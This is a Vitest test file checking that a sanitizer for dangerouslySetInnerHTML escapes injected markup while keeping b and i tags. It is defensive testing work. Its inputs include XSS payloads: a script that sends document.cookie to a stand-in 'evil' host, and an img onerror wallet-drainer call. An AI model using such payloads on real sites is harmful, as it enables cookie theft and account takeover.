import { describe, it, expect } from "vitest";
import { sanitizeRichText, richText } from "@/lib/i18n/rich-text";

describe("sanitizeRichText — the dangerouslySetInnerHTML chamber safety (pentest 28/07)", () => {
  // ── attack side: injection is neutralized ──
  it("neutralizes an injected <script> (via a var or poisoned catalog)", () => {
    const out = sanitizeRichText('Keys stored <b>encrypted</b><script>fetch("//evil?"+document.cookie)</script>');
    expect(out).not.toContain("<script>");
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("<b>encrypted</b>"); // legit emphasis survives
  });

  // The real security property: after removing the allow-listed tags, NO live
  // "<" or ">" remains — so nothing except <b>/<i> can reach the DOM as markup.
  // "onerror"/"onclick" may survive as INERT escaped text; that is harmless.
  const liveMarkup = (s: string) => s.replace(/<\/?[bi]>/g, "").match(/[<>]/g) ?? [];

  it("neutralizes an <img onerror> drainer payload (inert text only)", () => {
    const out = sanitizeRichText('<img src=x onerror="drainWallet()">');
    expect(liveMarkup(out)).toEqual([]);      // no live tag survives
    expect(out).toContain("&lt;img");         // it's escaped text now
    expect(out).not.toContain('onerror="');   // the real attribute form is gone (quotes escaped)
  });

  it("does not let an attacker smuggle a tag through attributes or casing", () => {
    // <b onclick=...> has content between the tag name and '>', so it does NOT
    // match the bare-tag allow-list → stays fully escaped (no live markup).
    expect(liveMarkup(sanitizeRichText('<b onclick="x">hi</b>'))).toEqual([]);
    // <B> (uppercase) is NOT in the allow-list → stays escaped, not a real tag.
    expect(sanitizeRichText("<B>hi</B>")).not.toContain("<B>");
  });

  // ── legit side: intended formatting still works ──
  it("preserves the only tags the real copy uses: <b> and <i>", () => {
    expect(sanitizeRichText("stored <b>encrypted</b> (AES-256)")).toBe("stored <b>encrypted</b> (AES-256)");
    expect(sanitizeRichText("expires in <i>24h</i>")).toBe("expires in <i>24h</i>");
  });

  it("richText returns the shape dangerouslySetInnerHTML expects", () => {
    expect(richText("<b>x</b>")).toEqual({ __html: "<b>x</b>" });
  });

  it("keeps ampersands and quotes as inert entities", () => {
    expect(sanitizeRichText('Tom & "Jerry"')).toBe("Tom &amp; &quot;Jerry&quot;");
  });
});
